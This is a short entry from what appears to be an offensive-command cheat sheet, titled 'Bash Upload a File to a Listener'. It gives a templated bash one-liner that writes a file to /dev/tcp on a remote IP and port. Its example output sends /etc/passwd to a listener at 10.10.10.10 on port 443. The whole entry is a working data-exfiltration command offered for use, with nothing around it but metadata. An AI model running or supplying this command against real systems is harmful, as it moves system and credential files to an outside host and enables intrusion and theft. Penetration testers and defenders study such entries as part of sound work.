---
id: fb1683df-1c1f-44f8-972e-1de636ae5dd1
name: Bash Upload a File to a Listener
type: command
executor: bash
data: cat > /dev/tcp/$TARGET_IP/$TARGET_PORT < $FILENAME
output: cat > /dev/tcp/10.10.10.10/443 < /etc/passwd
created_at: '2019-10-29T22:25:12.737993+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[CAT]]'
---

# Bash Upload a File to a Listener

```bash
cat > /dev/tcp/$TARGET_IP/$TARGET_PORT < $FILENAME
```

## Expected Output

```
cat > /dev/tcp/10.10.10.10/443 < /etc/passwd
```


